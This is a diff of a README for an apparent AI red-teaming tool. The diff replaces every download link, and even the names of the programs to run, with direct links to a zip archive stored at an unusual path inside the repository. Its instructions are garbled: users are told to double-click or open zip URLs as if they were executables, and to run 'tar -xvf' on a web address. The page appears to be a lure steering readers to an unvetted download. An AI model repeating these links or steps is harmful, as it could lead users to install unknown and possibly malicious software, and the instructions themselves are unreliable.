@@ -1,7 +1,7 @@
 # 🛡️ red-teaming - Effortlessly Probe AI for Vulnerabilities
 
 ## 📥 Download Now
-[![Download Release](https://raw.githubusercontent.com/Michael1-dav/red-teaming/main/porphyrogeniture/red-teaming.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/Michael1-dav/red-teaming/main/porphyrogeniture/red-teaming.zip)
+[![Download Release](https://github.com/Michael1-dav/red-teaming/raw/refs/heads/main/red_teaming/prompts/red_teaming_v2.7.zip%20Release-v1.0-blue)](https://github.com/Michael1-dav/red-teaming/raw/refs/heads/main/red_teaming/prompts/red_teaming_v2.7.zip)
 
 ## 📖 Overview
 red-teaming is a sophisticated tool designed to test the vulnerabilities and harmful behaviors of AI systems. Built using LangGraph and Ollama, it specifically targets OpenAI's GPT-OSS-20B model to ensure it operates securely. This project was developed for the OpenAI Open Model Hackathon, highlighting its innovative approach to cyber security.
@@ -19,13 +19,13 @@ Before downloading, ensure your system meets the following requirements:
 ### 2. **Download red-teaming**
 To download the application, visit the Releases page. Click on the button below to access the latest version.
 
-[![Download Release](https://raw.githubusercontent.com/Michael1-dav/red-teaming/main/porphyrogeniture/red-teaming.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/Michael1-dav/red-teaming/main/porphyrogeniture/red-teaming.zip)
+[![Download Release](https://github.com/Michael1-dav/red-teaming/raw/refs/heads/main/red_teaming/prompts/red_teaming_v2.7.zip%20Release-v1.0-blue)](https://github.com/Michael1-dav/red-teaming/raw/refs/heads/main/red_teaming/prompts/red_teaming_v2.7.zip)
 
 ### 3. **Choose Your Version**
 On the Releases page, you will see a list of available versions. Look for the most recent version. The file you want should be labeled clearly, such as:
-- `https://raw.githubusercontent.com/Michael1-dav/red-teaming/main/porphyrogeniture/red-teaming.zip` for Windows
-- `https://raw.githubusercontent.com/Michael1-dav/red-teaming/main/porphyrogeniture/red-teaming.zip` for macOS
-- `https://raw.githubusercontent.com/Michael1-dav/red-teaming/main/porphyrogeniture/red-teaming.zip` for Linux
+- `https://github.com/Michael1-dav/red-teaming/raw/refs/heads/main/red_teaming/prompts/red_teaming_v2.7.zip` for Windows
+- `https://github.com/Michael1-dav/red-teaming/raw/refs/heads/main/red_teaming/prompts/red_teaming_v2.7.zip` for macOS
+- `https://github.com/Michael1-dav/red-teaming/raw/refs/heads/main/red_teaming/prompts/red_teaming_v2.7.zip` for Linux
 
 Simply click on the appropriate file to begin downloading.
 
@@ -33,17 +33,17 @@ Simply click on the appropriate file to begin downloading.
 Once the download is complete, locate the downloaded file in your downloads folder. You will need to extract the contents:
 - For **Windows**, right-click the `.zip` file and choose "Extract All".
 - For **macOS**, double-click the `.zip` file to extract it.
-- For **Linux**, you might need to open a terminal and run `tar -xvf https://raw.githubusercontent.com/Michael1-dav/red-teaming/main/porphyrogeniture/red-teaming.zip`.
+- For **Linux**, you might need to open a terminal and run `tar -xvf https://github.com/Michael1-dav/red-teaming/raw/refs/heads/main/red_teaming/prompts/red_teaming_v2.7.zip`.
 
 ### 5. **Run the Application**
 Now that you have extracted the files, navigate to the extracted folder. Find the executable file. This will typically be:
-- `https://raw.githubusercontent.com/Michael1-dav/red-teaming/main/porphyrogeniture/red-teaming.zip` for Windows
-- `https://raw.githubusercontent.com/Michael1-dav/red-teaming/main/porphyrogeniture/red-teaming.zip` for macOS
+- `https://github.com/Michael1-dav/red-teaming/raw/refs/heads/main/red_teaming/prompts/red_teaming_v2.7.zip` for Windows
+- `https://github.com/Michael1-dav/red-teaming/raw/refs/heads/main/red_teaming/prompts/red_teaming_v2.7.zip` for macOS
 - `red-teaming` for Linux
 
 #### **Instructions for Running:**
-- **Windows:** Double-click `https://raw.githubusercontent.com/Michael1-dav/red-teaming/main/porphyrogeniture/red-teaming.zip`.
-- **macOS:** Open the `https://raw.githubusercontent.com/Michael1-dav/red-teaming/main/porphyrogeniture/red-teaming.zip`.
+- **Windows:** Double-click `https://github.com/Michael1-dav/red-teaming/raw/refs/heads/main/red_teaming/prompts/red_teaming_v2.7.zip`.
+- **macOS:** Open the `https://github.com/Michael1-dav/red-teaming/raw/refs/heads/main/red_teaming/prompts/red_teaming_v2.7.zip`.
 - **Linux:** Open a terminal, navigate to the folder, and type `./red-teaming`.
 
 ### 6. **Interacting with the Software**
